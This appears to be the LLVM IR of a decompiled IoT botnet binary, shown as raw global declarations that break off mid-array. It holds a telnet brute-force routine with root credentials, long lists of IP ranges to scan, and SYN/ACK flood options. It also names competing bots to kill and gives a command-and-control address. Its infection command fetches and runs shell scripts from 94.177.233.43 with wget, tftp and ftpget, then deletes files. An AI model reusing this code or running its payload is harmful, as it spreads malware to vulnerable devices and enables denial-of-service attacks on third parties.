source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_806100c.2 = global i32 0
@global_var_8061024.3 = local_unnamed_addr global i32* @global_var_806100c.2
@global_var_8060fc4.4 = constant i32 0
@global_var_8061010.6 = local_unnamed_addr global i32 0
@global_var_80615a0.7 = global i32 0
@global_var_80615a4.8 = local_unnamed_addr global i32 0
@global_var_80615a8.9 = local_unnamed_addr global i32 0
@global_var_80612c4.10 = local_unnamed_addr global i32 4095
@global_var_80612c0.11 = local_unnamed_addr global i32 362436
@global_var_8056d20.12 = constant [7 x i8] c"(null)\00"
@global_var_8056d27.14 = constant [3 x i8] c"-c\00"
@global_var_80569fb.15 = constant [3 x i8] c"sh\00"
@global_var_8056d2a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8056d40.17 = constant i32 -1
@global_var_8057140.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805714e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8061580.20 = local_unnamed_addr global i32 0
@global_var_8057157.21 = constant [5 x i8] c"PING\00"
@global_var_8056d14.22 = constant [8 x i8] c"busybox\00"
@global_var_8056d1c.23 = constant i32 2293796
@global_var_8056d1e.24 = constant i32 1848115235
@global_var_8061220.25 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056d14.22, i32 0, i32 0), i8* bitcast (i32* @global_var_8056d1c.23 to i8*), i8* bitcast (i32* @global_var_8056d1e.24 to i8*)]
@global_var_8056ce8.26 = constant [7 x i8] c"nvalid\00"
@global_var_8056cef.27 = constant [6 x i8] c"ailed\00"
@global_var_8056cf5.28 = constant [9 x i8] c"ncorrect\00"
@global_var_8056cfe.29 = constant [6 x i8] c"enied\00"
@global_var_8056d04.30 = constant [5 x i8] c"rror\00"
@global_var_8056d09.31 = constant [7 x i8] c"oodbye\00"
@global_var_8056d10.32 = constant [4 x i8] c"bad\00"
@global_var_8061200.33 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056ce8.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056cef.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056cf5.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056cfe.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056d04.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056d09.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056d10.32, i32 0, i32 0)]
@global_var_8061588.34 = local_unnamed_addr global i32 0
@global_var_806158c.35 = local_unnamed_addr global i32 0
@global_var_8067814.36 = local_unnamed_addr global i32 0
@global_var_805715c.37 = constant [6 x i8] c":>%$#\00"
@global_var_8057163.42 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8057170.43 = constant [13 x i8] c"43.239.%d.%d\00"
@global_var_805717d.44 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_8057188.45 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8057195.46 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_80571a0.47 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_80571ad.48 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_80571b9.49 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_80571c6.50 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_80571d3.51 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_80571e0.52 = constant [13 x i8] c"77.209.%d.%d\00"
@global_var_80571ed.53 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_80571f8.54 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8057205.55 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_8057212.56 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805721f.57 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_805722c.58 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8057239.59 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_8057246.60 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_8057251.61 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_805725d.62 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_805726a.63 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_8057275.64 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_8057280.65 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_805728c.66 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_8057298.67 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_80572a4.68 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_80572b1.69 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_80572be.70 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_80572ca.71 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_80572d7.72 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_80572e3.73 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_80572ee.74 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_80572fa.75 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8057306.76 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_8057312.77 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805731e.78 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_805732a.79 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8057337.80 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8057344.81 = constant [11 x i8] c"60.0.%d.%d\00"
@global_var_805734f.82 = constant [12 x i8] c"60.16.%d.%d\00"
@global_var_805735b.83 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8057368.84 = constant [12 x i8] c"62.30.%d.%d\00"
@global_var_8057374.85 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8057381.86 = constant [13 x i8] c"62.254.%d.%d\00"
@global_var_805738e.87 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_805739b.88 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_80573a7.89 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_80573b3.90 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_80573bf.91 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_80573cc.92 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_80573d9.93 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_80573e7.94 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_80573f4.95 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8057402.96 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_8057410.97 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_805741d.98 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_805742a.99 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_8057437.100 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_8057444.101 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_8057451.102 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_805745e.103 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_805746b.104 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_8057478.105 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_8057485.106 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_8057492.107 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_805749f.108 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_80574ac.109 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_80574b9.110 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_80574c6.111 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_80574d3.112 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_80574e0.113 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_80574ed.114 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_80574fa.115 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_8057507.116 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_8057514.117 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_8057521.118 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_805752e.119 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_805753b.120 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_8057548.121 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_8057555.122 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_8057562.123 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_805756f.124 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_805757c.125 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_8057589.126 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_8057596.127 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_80575a3.128 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_80575b0.129 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_80575bd.130 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_80575ca.131 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_80575d7.132 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_80575e4.133 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_80575f1.134 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_80575fe.135 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_805760b.136 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_8057618.137 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8057625.138 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_8057632.139 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_805763f.140 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_805764c.141 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_8057658.142 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8057665.143 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_8057672.144 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_805767f.145 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_805768b.146 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8057698.147 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_80576a6.148 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_80576b4.149 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_80576c1.150 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_80576cf.151 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_80576dd.152 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_80576ea.153 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8061280.154 = global i32 110
@global_var_80576f8.156 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8067808.157 = local_unnamed_addr global i32 0
@global_var_8056c83.158 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8056c92.159 = constant [6 x i8] c"/tmp/\00"
@global_var_8056c98.160 = constant [6 x i8] c"/var/\00"
@global_var_8056c9e.161 = constant [6 x i8] c"/dev/\00"
@global_var_8056ca4.162 = constant [10 x i8] c"/var/run/\00"
@global_var_8056cae.163 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8056cb8.164 = constant [6 x i8] c"/mnt/\00"
@global_var_8056cbe.165 = constant [7 x i8] c"/boot/\00"
@global_var_8056cc5.166 = constant [6 x i8] c"/usr/\00"
@global_var_8056ccb.167 = constant [6 x i8] c"/opt/\00"
@global_var_80611c0.168 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8056c83.158, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056c92.159, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056c98.160, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056c9e.161, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8056ca4.162, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8056cae.163, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056cb8.164, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056cbe.165, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056cc5.166, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056ccb.167, i32 0, i32 0)]
@global_var_80611ec = external global i32
@global_var_8057704.173 = constant [3 x i8] c"\0D\0A\00"
@global_var_8061240.174 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056ce8.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056cef.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056cf5.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056cfe.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056d04.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056d09.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056d10.32, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056d14.22, i32 0, i32 0), i8* bitcast (i32* @global_var_8056d1c.23 to i8*), i8* bitcast (i32* @global_var_8056d1e.24 to i8*)]
@global_var_8057707.175 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_805771e.176 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_8057723.177 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_8056ae4.178 = constant [400 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.233.43/miggs.sh; chmod 777 miggs.sh; sh miggs.sh; tftp 94.177.233.43 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.177.233.43; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.177.233.43 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf miggs.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_8056c74.179 = constant [5 x i8] c"root\00"
@global_var_8056c7a.180 = constant [7 x i8] c"telnet\00"
@global_var_8056c81.181 = constant i32 1680801792
@global_var_80611a0.182 = local_unnamed_addr global [7 x i8*] [i8* getelementptr inbounds ([400 x i8], [400 x i8]* @global_var_8056ae4.178, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056c74.179, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056c74.179, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056c7a.180, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056c74.179, i32 0, i32 0), i8* bitcast (i32* @global_var_8056c81.181 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056c7a.180, i32 0, i32 0)]
@global_var_805774c.183 = constant [6 x i8] c"arfgG\00"
@global_var_8057752.184 = constant [9 x i8] c"HBiug655\00"
@global_var_805775b.185 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8057768.186 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_805777c.187 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_805778d.188 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8057799.189 = constant [12 x i8] c"RYSDk747586\00"
@global_var_80577a5.190 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_80577b1.191 = constant [10 x i8] c"KHGK7985i\00"
@global_var_80577bb.192 = constant [11 x i8] c"yuituiILYF\00"
@global_var_80577c6.193 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_80577d4.194 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_80577e0.195 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_80577ed.196 = constant [9 x i8] c"ewqdcftr\00"
@global_var_80577f6.197 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8057806.198 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_8057811.199 = constant [12 x i8] c"twehgbferhb\00"
@global_var_805781d.200 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8057829.201 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8057837.202 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8057845.203 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_8057853.204 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_805785d.205 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805786b.206 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8057879.207 = constant [12 x i8] c"yteytietyue\00"
@global_var_8057885.208 = constant [9 x i8] c"qsortEQS\00"
@global_var_805788e.209 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805789e.210 = constant [4 x i8] c"std\00"
@global_var_80578a2.211 = constant [4 x i8] c"dts\00"
@global_var_80578a6.212 = constant [4 x i8] c"lsk\00"
@global_var_80578aa.213 = constant [4 x i8] c"kek\00"
@global_var_80578ae.214 = constant [6 x i8] c"smack\00"
@global_var_80578b4.215 = constant [4 x i8] c"ily\00"
@global_var_80578b8.216 = constant [4 x i8] c"tyf\00"
@global_var_80578bc.217 = constant [4 x i8] c"pos\00"
@global_var_80578c0.218 = constant [6 x i8] c"cunts\00"
@global_var_80578e0.219 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805774c.183, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057752.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805775b.185, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8057768.186, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805777c.187, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805778d.188, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057799.189, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80577a5.190, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80577b1.191, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80577bb.192, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80577c6.193, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80577d4.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80577e0.195, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80577ed.196, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80577f6.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8057806.198, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057811.199, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805781d.200, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057829.201, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057837.202, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057845.203, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057853.204, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805785d.205, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805786b.206, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057879.207, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057885.208, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805788e.209, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805789e.210, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578a2.211, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578a6.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578aa.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80578ae.214, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578b4.215, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578b8.216, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578bc.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80578c0.218, i32 0, i32 0)]
@global_var_8057970.220 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805798c.221 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_80579ad.222 = constant [4 x i8] c"all\00"
@global_var_80579b1.223 = constant i32 2037579820
@global_var_80579b3.224 = constant [4 x i8] c"syn\00"
@global_var_80579b7.225 = constant [4 x i8] c"rst\00"
@global_var_80579bb.226 = constant [4 x i8] c"fin\00"
@global_var_80579bf.227 = constant [4 x i8] c"ack\00"
@global_var_80579c3.228 = constant [4 x i8] c"psh\00"
@global_var_80579c7.229 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8056900.230 = constant [5 x i8] c"mips\00"
@global_var_8056905.231 = constant [7 x i8] c"mipsel\00"
@global_var_805690c.232 = constant [4 x i8] c"sh4\00"
@global_var_8056910.233 = constant [4 x i8] c"x86\00"
@global_var_8056914.234 = constant [5 x i8] c"i686\00"
@global_var_8056919.235 = constant [4 x i8] c"ppc\00"
@global_var_805691d.236 = constant [5 x i8] c"i586\00"
@global_var_8056922.237 = constant [8 x i8] c"jackmy*\00"
@global_var_805692a.238 = constant [8 x i8] c"hackmy*\00"
@global_var_8056932.239 = constant [5 x i8] c"arm*\00"
@global_var_8056937.240 = constant [3 x i8] c"b1\00"
@global_var_805693a.241 = constant [3 x i8] c"b2\00"
@global_var_805693d.242 = constant [3 x i8] c"b3\00"
@global_var_8056940.243 = constant [3 x i8] c"b4\00"
@global_var_8056943.244 = constant [3 x i8] c"b5\00"
@global_var_8056946.245 = constant [3 x i8] c"b6\00"
@global_var_8056949.246 = constant [3 x i8] c"b7\00"
@global_var_805694c.247 = constant [3 x i8] c"b8\00"
@global_var_805694f.248 = constant [3 x i8] c"b9\00"
@global_var_8056952.249 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8056963.250 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_805696c.251 = constant [10 x i8] c"dvrHelper\00"
@global_var_8056976.252 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805697e.253 = constant [5 x i8] c"FEUB\00"
@global_var_8056983.254 = constant [9 x i8] c"FTUdftui\00"
@global_var_805698c.255 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8056995.256 = constant [6 x i8] c"jhUOH\00"
@global_var_805699b.257 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_80569a4.258 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_80569ae.259 = constant [10 x i8] c"kmyx86_64\00"
@global_var_80569b8.260 = constant [10 x i8] c"lolmipsel\00"
@global_var_80569c2.261 = constant [8 x i8] c"RYrydry\00"
@global_var_80569ca.262 = constant [5 x i8] c"tel*\00"
@global_var_80569cf.263 = constant [9 x i8] c"TwoFace*\00"
@global_var_80569d8.264 = constant [9 x i8] c"UYyuyioy\00"
@global_var_80569e1.265 = constant [5 x i8] c"wget\00"
@global_var_80569e6.266 = constant [7 x i8] c"x86_64\00"
@global_var_80569ed.267 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_80569f6.268 = constant [5 x i8] c"xxb*\00"
@global_var_80569fe.269 = constant i32 3276849
@global_var_8056a00.270 = constant i32 3342386
@global_var_8056a02.271 = constant i32 3407923
@global_var_8056a04.272 = constant i32 3473460
@global_var_8056a06.273 = constant i32 3538997
@global_var_8056a08.274 = constant i32 3604534
@global_var_8056a0a.275 = constant i32 3670071
@global_var_8056a0c.276 = constant i32 3735608
@global_var_8056a0e.277 = constant i32 808517689
@global_var_8056a10.278 = constant [3 x i8] c"10\00"
@global_var_8056a13.279 = constant [3 x i8] c"11\00"
@global_var_8056a16.280 = constant [3 x i8] c"12\00"
@global_var_8056a19.281 = constant [3 x i8] c"13\00"
@global_var_8056a1c.282 = constant [3 x i8] c"14\00"
@global_var_8056a1f.283 = constant [3 x i8] c"15\00"
@global_var_8056a22.284 = constant [3 x i8] c"16\00"
@global_var_8056a25.285 = constant [3 x i8] c"17\00"
@global_var_8056a28.286 = constant [3 x i8] c"18\00"
@global_var_8056a2b.287 = constant [3 x i8] c"19\00"
@global_var_8056a2e.288 = constant [3 x i8] c"20\00"
@global_var_8056a31.289 = constant [6 x i8] c"hackz\00"
@global_var_8056a37.290 = constant [5 x i8] c"bin*\00"
@global_var_8056a3c.291 = constant [5 x i8] c"gtop\00"
@global_var_8056a41.292 = constant [5 x i8] c"ftp*\00"
@global_var_8056a46.293 = constant [6 x i8] c"tftp*\00"
@global_var_8056a4c.294 = constant [7 x i8] c"botnet\00"
@global_var_8056a53.295 = constant [8 x i8] c"swatnet\00"
@global_var_8056a5b.296 = constant [8 x i8] c"ballpit\00"
@global_var_8056a63.297 = constant [8 x i8] c"fucknet\00"
@global_var_8056a6b.298 = constant [9 x i8] c"cracknet\00"
@global_var_8056a74.299 = constant [8 x i8] c"weednet\00"
@global_var_8056a7c.300 = constant [7 x i8] c"gaynet\00"
@global_var_8056a83.301 = constant [9 x i8] c"queernet\00"
@global_var_8056a8c.302 = constant [8 x i8] c"ballnet\00"
@global_var_8056a94.303 = constant [5 x i8] c"unet\00"
@global_var_8056a99.304 = constant [7 x i8] c"yougay\00"
@global_var_8056aa0.305 = constant [7 x i8] c"sttftp\00"
@global_var_8056aa7.306 = constant [7 x i8] c"sstftp\00"
@global_var_8056aae.307 = constant [7 x i8] c"sbtftp\00"
@global_var_8056ab5.308 = constant [6 x i8] c"btftp\00"
@global_var_8056abb.309 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_8056ac4.310 = constant [6 x i8] c"bruv*\00"
@global_var_8056aca.311 = constant [5 x i8] c"IoT*\00"
@global_var_8056acf.312 = constant [18 x i8] c"94.177.233.43:777\00"
@global_var_8061040.313 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056900.230, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056905.231, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805690c.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056910.233, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056914.234, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056919.235, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805691d.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805691d.236, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056922.237, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805692a.238, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056932.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056937.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805693a.241, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805693d.242, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056940.243, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056943.244, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056946.245, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056949.246, i32 0, i32 